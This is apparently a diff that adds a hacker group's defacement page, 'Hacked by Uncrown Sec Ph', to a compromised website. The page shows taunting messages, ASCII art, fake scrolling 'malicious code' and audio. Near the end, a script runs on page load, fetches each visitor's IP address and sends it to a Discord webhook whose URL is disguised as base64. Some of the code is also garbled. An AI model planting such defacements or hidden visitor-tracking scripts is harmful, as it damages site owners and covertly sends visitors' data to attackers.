@@ -1,0 +1,595 @@
+<html>
+<head>
+<title>
+Hacked by Uncrown Sec Ph
+</title>
+<style>
+
+        body {
+            background-color: black;
+            color: white;
+            font-family: 'Iceland', cursive;
+            margin: 0;
+            overflow: auto;
+        }
+        
+        h1 {
+            font-size: 30px;
+            font-family: 'Iceland', cursive;
+            color: red;
+            animation: bounce 1s infinite alternate ease-in-out;
+        }
+        
+        .view-photo-page {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin-bottom: 0px;
+            padding-bottom: 10px;
+        }
+        
+        #photoViewer {
+            width: 400px;
+            height: auto;
+            border: 2px solid white;
+            margin-bottom: 0px;
+            padding-bottom: 10px;
+        }
+        
+        @keyframes bounce {
+            from {
+                transform: translateY(0);
+            }
+            to {
+                transform: translateY(-20px);
+            }
+        }
+        
+        .logos {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            margin: 20px 0;
+        }
+        
+        .logos img {
+            width: 150px;
+            height: 150px;
+        }
+        
+        .logos img.round {
+            border-radius: 50%
+        }
+        
+        .popup {
+            position: fixed;
+            top: 50%
+            left: 50%
+            transform: translate(-50%, -50%);
+            background-color: red;
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            z-index: 9999;
+            display: none;
+        }
+        
+        .popup button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            background-color: green;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        
+        .code {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%
+            height: 100%
+            pointer-events: none;
+            z-index: -1;
+            font-size: 14px;
+            font-family: 'Courier New', Courier, monospace;
+            white-space: pre-wrap;
+            color: rgba(0, 255, 0, 0.8);
+            animation: fadeText 4s linear infinite, scrolling 15s linear infinite;
+        }
+        
+        @keyframes fadeText {
+            0%,
+            100% {
+                color: rgba(255, 0, 0, 0.8);
+            }
+            25% {
+                color: rgba(0, 255, 0, 0.8);
+            }
+            50% {
+                color: rgba(0, 0, 255, 0.8);
+            }
+            75% {
+                color: rgba(255, 255, 0, 0.8);
+            }
+        }
+        
+        @keyframes scrolling {
+            from {
+                transform: translateY(100%);
+            }
+            to {
+                transform: translateY(-100%);
+            }
+        }
+        
+        @keyframes scrolling {
+            from {
+                transform: translateY(100%);
+            }
+            to {
+                transform: translateY(-100%);
+            }
+        }
+        
+        .buttons {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+            gap: 10px;
+        }
+        
+        .buttons a {
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+        }
+        
+        .buttons a.facebook {
+            background-color: #3b5998;
+        }
+        
+        .buttons a.telegram {
+            background-color: #0088cc;
+        }
+        
+        .tags {
+            text-align: center;
+            margin: 10px 0;
+        }
+        
+        .tags button {
+            padding: 10px 20px;
+            background-color: purple;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        /* View-source protection */
+        
+        body {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+        
+        body::after {
+            content: "";
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 100%
+            height: 100%
+            pointer-events: none;
+        }
+    
+</style>
+<script>
+
+        function openPhotos() {
+            const images = [
+                "https://j.top4top.io/p_3266k98vm2.jpg",
+                "https://i.top4top.io/p_32669tn6y1.jpg",
+                "https://k.top4top.io/p_3266omprj3.jpg",
+                "https://g.top4top.io/p_3266fz83y1.png",
+                "https://h.top4top.io/p_32666hfh82.png"
+            ];
+            let index = 0;
+
+            function showNextImage() {
+                if (index >
+= images.length) index = 0;
+                const imgTag = document.getElementById('photoViewer');
+                imgTag.src = images[index];
+                index  ;
+            }
+
+            setInterval(showNextImage, 2000); // Change image every 2 seconds
+            document.querySelector('.view-photo-page').style.display = 'block';
+        }
+    
+</script>
+<script>
+
+        document.addEventListener("DOMContentLoaded", function() {
+            const popup = document.querySelector(".popup");
+            popup.style.display = "block";
+
+            document.querySelector(".popup button").addEventListener("click", () =>
+ {
+                popup.style.display = "none";
+            });
+        });
+    
+</script>
+</head>
+<body>
+<div class="popup">
+<h2>
+Hacked by Uncrown Sec Phillipines
+</h2>
+<p>
+Your website is under our control!
+</p>
+<button>
+OK
+</button>
+</div>
+<div class="logos">
+<img alt="Left Logo" class="round" src="images/1735097583225.jpg"/>
+<img alt="Center Logo" src="images/1725152814816.jpg"/>
+<img alt="Right Logo" class="round" src="images/1735097556711.jpg"/>
+</div>
+<center>
+<h1>
+<font color="#ff0000">
+HACKED BY
+</font>
+<font color="#00b300">
+Uncrown Sec Phillipines
+</font>
+</h1>
+<br/>
+<br/>
+<center>
+<div class="code">
+<pre>
+                    // Hacker code in background
+                    setInterval(() =&gt; {
+                        console.log("ð¥ Hacked by Ph.Shiro ð¥");
+                        console.log("%cYour system is under control!", "color: red; font-size: 20px; font-weight: bold;");
+                    }, 3000);
+
+                    setInterval(() =&gt; {
+                        console.log(`
+                        eeeeeee..eee..eee.eee.eee....eee....eee.eeeeeee..eee.eeeeeee..eeeeee..eeeeee.                              
+@@@@@@@@:@@@::@@@:@@@:@@@::::@@@::::@@@:@@@@@@@@:@@@:@@@@@@@@:@@@@@@:@@@@@@@:                              
+%%%--%%%-%%%--%%%-%%%-%%%----%%%----%%%-%%%--%%%-%%%-%%%--%%%-%%%----%%%-----                              
+&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;+&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;+&amp;&amp;&amp;+&amp;&amp;&amp;++++&amp;&amp;&amp;++++&amp;&amp;&amp;+&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;+&amp;&amp;&amp;+&amp;&amp;&amp;++&amp;&amp;&amp;+&amp;&amp;&amp;&amp;&amp;++&amp;&amp;&amp;&amp;&amp;&amp;++                              
+|||||||**||||||||*|||*|||****|||****|||*|||||||**|||*|||**|||*|||||***||||||*                              
+!!!======!!!==!!!=!!!=!!!====!!!====!!!=!!!======!!!=!!!==!!!=!!!========!!!=                              
+:::######:::##:::#:::#::::::#::::::#:::#:::######:::#:::##:::#::::::#:::::::#                              
+...@@@@@@...@@...@...@......@......@...@...@@@@@@...@...@@...@......@......@@                              
+                                                                                                           
+.eeeee.eee...eee.eeeeeee..eeeeee.eeeeeee.........eeeeee..eee....eee....eee..eeeeee..eeeeeee...eeeee.eeeeee.
+@@@@@@:@@@:::@@@.@@@@@@@@:@@@@@@:@@@@@@@@:::::::@@@@@@@@:@@@::::@@@::::@@@:@@@@@@@@:@@@@@@@@:@@@@@@:@@@@@@:
+%%%----%%%---%%%-%%%--%%%-%%%----%%%--%%%-------%%%--%%%-%%%----%%%----%%%-%%%--%%%-%%%--%%%-%%%----%%%----
+&amp;&amp;&amp;+++++&amp;&amp;&amp;&amp;&amp;&amp;&amp;++&amp;&amp;&amp;&amp;&amp;&amp;&amp;++&amp;&amp;&amp;&amp;&amp;++&amp;&amp;&amp;&amp;&amp;&amp;&amp;++++++++&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;+&amp;&amp;&amp;++++&amp;&amp;&amp;++++&amp;&amp;&amp;+&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;+&amp;&amp;&amp;++&amp;&amp;&amp;+&amp;&amp;&amp;++++&amp;&amp;&amp;&amp;&amp;++
+|||******|||||***||||||||*|||||**||||||*********||||||||*|||****|||****|||*||||||||*|||**|||*|||****|||||**
+!!!=======!!!====!!!==!!!=!!!====!!!=!!!========!!!==!!!=!!!====!!!====!!!=!!!==!!!=!!!==!!!=!!!====!!!====
+::::::####:::####::::::::#::::::#:::##:::#######:::##:::#::::::#::::::#:::#:::##:::#:::##:::#::::::#::::::#
+@.....@@@@...@@@@.......@@......@...@@...@@@@@@@...@@...@......@......@...@...@@...@...@@...@@.....@......@
+                                                                                                           
+                        ð SYSTEM  ARE NOT BREACHED Hacked by Uncrown Sec Ph | Phillipines Cyber Alliance
+                        `);
+                    }, 5000);
+                    console.log("â ï¸ Warning: Unauthorized Access Detected! Initiating Counter-Hack...");
+setTimeout(() =&gt; {
+    alert("ð¥ OWN THIS SYSTEM ð¥");
+}, 5000);
+
+let text = "ð¥ HACKED BY Ph.Gojo ð¥ ";
+setInterval(() =&gt; {
+    document.body.innerHTML  = text.repeat(100);
+}, 1000);
+
+eee..eee.eeeeeee...eeeee.eeeeeee...eeeeee..eee..eee..eee.eeeeeee.....        
+@@@::@@@:@@@@@@@@:@@@@@@:@@@@@@@@:@@@@@@@@:@@@::@@@::@@@:@@@@@@@@::::        
+%%%--%%%-%%%--%%%-%%%----%%%--%%%-%%%--%%%-%%%--%%%--%%%-%%%--%%%----        
+&amp;&amp;&amp;++&amp;&amp;&amp;+&amp;&amp;&amp;++&amp;&amp;&amp;+&amp;&amp;&amp;++++&amp;&amp;&amp;&amp;&amp;&amp;&amp;++&amp;&amp;&amp;++&amp;&amp;&amp;+&amp;&amp;&amp;++&amp;&amp;&amp;++&amp;&amp;&amp;+&amp;&amp;&amp;++&amp;&amp;&amp;++++        
+|||**|||*|||**|||*|||****||||||***|||**|||*|||**|||**|||*|||**|||****        
+!!!==!!!=!!!==!!!=!!!====!!!=!!!==!!!==!!!=!!!==!!!==!!!=!!!==!!!====        
+::::::::#:::##:::#::::::#:::##:::#::::::::#:::::::::::::#:::##:::####        
+@......@@...@@...@@.....@...@@...@@......@@@...........@@...@@...@@@@        
+                                                                             
+.eeeeee.eeeeee..eeeee.                                                       
+@@@@@@@:@@@@@@:@@@@@@:                                                       
+%%%-----%%%----%%%----                                                       
+&amp;&amp;&amp;&amp;&amp;&amp;++&amp;&amp;&amp;&amp;&amp;++&amp;&amp;&amp;++++                                                       
+*||||||*|||||**|||****                                                       
+====!!!=!!!====!!!====                                                       
+:::::::#::::::#::::::#                                                       
+......@@......@@.....@                                                       
+                                                                             
+eeeeeee..eee..eee.eee.eee....eee....eee.eeeeeee..eee.eeeeeee..eeeeee..eeeeee.
+@@@@@@@@:@@@::@@@:@@@:@@@::::@@@::::@@@:@@@@@@@@:@@@:@@@@@@@@:@@@@@@:@@@@@@@:
+%%%--%%%-%%%--%%%-%%%-%%%----%%%----%%%-%%%--%%%-%%%-%%%--%%%-%%%----%%%-----
+&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;+&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;+&amp;&amp;&amp;+&amp;&amp;&amp;++++&amp;&amp;&amp;++++&amp;&amp;&amp;+&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;+&amp;&amp;&amp;+&amp;&amp;&amp;++&amp;&amp;&amp;+&amp;&amp;&amp;&amp;&amp;++&amp;&amp;&amp;&amp;&amp;&amp;++
+|||||||**||||||||*|||*|||****|||****|||*|||||||**|||*|||**|||*|||||***||||||*
+!!!======!!!==!!!=!!!=!!!====!!!====!!!=!!!======!!!=!!!==!!!=!!!========!!!=
+:::######:::##:::#:::#::::::#::::::#:::#:::######:::#:::##:::#::::::#:::::::#
+...@@@@@@...@@...@...@......@......@...@...@@@@@@...@...@@...@......@......@@
+                                                                             
+                                                      let text = "ð¥ HACKED BY Ph.Gojo ð¥ ";   
+                                                      
+                                                      let counter = 0;
+setInterval(() =&gt; {
+    console.log(`ð» Injecting malicious code... [${counter  }]`);
+}, 500);
+
+                           
+eee..eee..eeeeee...eeeee.eee..eee.eeeeee.eeeeeee.....eeeeeee..eee...eee.....
+@@@::@@@:@@@@@@@@:@@@@@@:@@@::@@@:@@@@@@:@@@@@@@@::::@@@@@@@@:@@@:::@@@.@@@:
+%%%--%%%-%%%--%%%-%%%----%%%-%%%--%%%----%%%--%%%----%%%--%%%-%%%---%%%-%%%-
+&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;+&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;+&amp;&amp;&amp;++++&amp;&amp;&amp;&amp;&amp;&amp;+++&amp;&amp;&amp;&amp;&amp;++&amp;&amp;&amp;++&amp;&amp;&amp;++++&amp;&amp;&amp;&amp;&amp;&amp;&amp;+++&amp;&amp;&amp;&amp;&amp;&amp;&amp;++++++
+||||||||*||||||||*|||****||||||***|||||**|||**|||****||||||||***|||||*******
+!!!==!!!=!!!==!!!=!!!====!!!=!!!==!!!====!!!==!!!====!!!==!!!====!!!====!!!=
+:::##:::#:::##:::#::::::#:::##:::#::::::#::::::::####::::::::####:::####:::#
+...@@...@...@@...@@.....@...@@...@......@.......@@@@@.......@@@@@...@@@@@@@@
+                                                                            
+                   setInterval(() =&gt; {
+                    document.body.style.backgroundColor = 
+                       document.body.style.backgroundColor === "black" ? "red" : "black";
+                            }, 100);
+
+                             eeeeeee..eee..eee......eeeeee...eeeeee..eeeeeee..eeeeee..
+@@@@@@@@:@@@::@@@:::::@@@@@@@@:@@@@@@@@:@@@@@@@:@@@@@@@@:
+%%%--%%%-%%%--%%%-----%%%------%%%--%%%-----%%%-%%%--%%%-
+&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;+&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;+++++&amp;&amp;&amp;++++++&amp;&amp;&amp;++&amp;&amp;&amp;+++++&amp;&amp;&amp;+&amp;&amp;&amp;++&amp;&amp;&amp;+
+|||||||**||||||||*****|||*||||*|||**|||*****|||*|||**|||*
+!!!======!!!==!!!=====!!!==!!!=!!!==!!!=!!==!!!=!!!==!!!=
+:::######:::##:::#:::#::::::::#::::::::#:::::::#::::::::#
+...@@@@@@...@@...@...@@......@@@......@@@.....@@@......@@
+                                                         
+                                                                                                                                  
+                             let counter = 0;
+                             setInterval(() =&gt; {
+                                 console.log(`ð» Injecting malicious code... [${counter  }]`);
+                             }, 500);
+                                                                                                                                        
+                            
+                                                                                                      
+
+
+                    
+                    
+
+    
+</pre>
+</div>
+<div class="buttons">
+<a class="facebook" href="https://facebook.com" target="_blank">
+Go to Our Facebook
+</a>
+<a class="telegram" href="https://t.me/UncrownSP" target="_blank">
+Join Our Telegram
+</a>
+</div>
+<div class="tags">
+<button onclick="openPhotos()">
+View Photos
+</button>
+</div>
+<div class="view-photo-page">
+<h2>
+Photo Viewer
+</h2>
+<img alt="Photo" id="photoViewer" src="images/1725152814816.jpg" style="width: 400px; height: auto; border: 3px solid white; margin-top: 50px;"/>
+</div>
+<br/>
+<center>
+<font color="white" face="Iceland" size="3">
+- Hello Admin ! -
+                    
+<font size="2">
+Your Website Has Been Hacked By Uncrown Sec Ph<br/>
+<font color="00b8e6" face="Iceland" size="3">
+Op's something smells bad here!   <br/>don't worry your files are not deleted, we want to convey the weakness of your security by defacing
+                            
+                        
+</font>
+</font>
+</font>
+<center>
+<font color="white" face="Iceland" size="3">
+<font size="2">
+<font color="white" face="Iceland" size="3">
+<font color="white" face="Iceland" size="3">
+WE ARE Phillipines Cyber Alliance
+                                
+</font>
+</font>
+</font>
+</font>
+<center>
+<font color="white" face="Iceland" size="3">
+<font size="2">
+<font color="white" face="Iceland" size="3">
+<font color="white" size="3">
+- ENJOY THE DESTRUCTION OF YOUR WEBSITE -
+<br/>
+<font color="white" face="Iceland">
+- Uncrown Sec Ph
+                                        
+</font>
+<br/>
+<br/>
+</font>
+</font>
+</font>
+</font>
+<center>
+<font color="white" face="Iceland" size="3">
+<font size="2">
+<font color="white" face="Iceland" size="3">
+<font color="white" size="3">
+<font color="red" size="3">
+Uncrown Sec Ph
+                                            
+</font>
+<br/>
+<br/>
+</font>
+</font>
+</font>
+</font>
+<center>
+<font color="white" face="Iceland" size="3">
+<font size="2">
+<font color="white" face="Iceland" size="3">
+<font color="white" size="3">
+<font color="silver" face="Iceland" size="2">
+" Geetz"
+                                                
+</font>
+<br/>
+</font>
+</font>
+</font>
+</font>
+<center>
+<font color="white" face="Iceland" size="3">
+<font size="2">
+<font color="white" face="Iceland" size="3">
+<font color="white" size="3">
+<font color="green" face="Iceland" size="2">
+<marquee>
+~ Phillipines Cyber Alliance || to all under of PCA and to you
+</marquee>
+</font>
+<br/>
+<br/>
+<button class="lagu" onclick="play();liat();">
+<font face="Pacifico" size="6">
+Play
+</font>
+</button>
+<button class="lagu" onclick="pause();liat();">
+<font face="Pacifico">
+<font size="4">
+<font color="black">
+Pause
+</font>
+</font>
+</font>
+<font face="Pacifico">
+<br/>
+<br/>
+<audio id="lagu" src="https://j.top4top.io/m_3266j8jso1.mp3">
+<font color="white" face="Iceland" size="3">
+<font size="2">
+<font color="white" face="Iceland" size="3">
+<font color="white" size="3">
+<script>
+
+                  function play(){ var audio = document.getElementById('lagu'); audio.play(); } function liat(){ document.getElementById('galiat').style.visibility='visible'; } function pause(){ var audio = document.getElementById('lagu'); audio.pause(); } function liat(){ document.getElementById('galiat').style.visibility='visible'; } 
+                  
+</script>
+</font>
+</font>
+</font>
+</font>
+</audio>
+</font>
+</button>
+</font>
+</font>
+</font>
+</font>
+</center>
+<center>
+<font color="white" face="Iceland" size="3">
+<font size="2">
+<font color="white" face="Iceland" size="3">
+<font color="white" size="3">
+<font color="white" face="Iceland" size="4">
+- \*We Are Uncrown Sec Ph*/ -
+                                                    
+</font>
+</font>
+</font>
+</font>
+</font>
+</center>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<script>
+
+        document.addEventListener('DOMContentLoaded', function() {
+
+            const encryptedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxNjA4NDA1MjQ4NjM4OTg4My9LNDhFRVNaYzlwZjRXcExEMkFpblU0UlptYk5rdEptV0VzUzhIakIwTGFzS3c0MzRESk1fQXNKcC01a1IwRGZJOW1TVQ==";
+
+
+            function decryptWebhook(encrypted) {
+                return atob(encrypted);
+            }
+
+
+            async function fetchIPAddress() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    console.error('Error fetching IP address:', error);
+                    return null;
+                }
+            }
+
+            async function sendIP(ip) {
+                const webhookURL = decryptWebhook(encryptedWebhook);
+                const payload = {
+                    content: `New IP Address: ${ip}`
+                };
+
+                try {
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                } catch (error) {
+                    console.error('Error :', error);
+                }
+            }
+
+            (async function() {
+                const ip = await fetchIPAddress();
+                if (ip) {
+                    sendIP(ip);
+
+                }
+            })();
+        });
+    
+</script>
+</center>
+</center>
+</center>
+</center>
+</center>
+</center>
+</center>
+</body>
+</html>
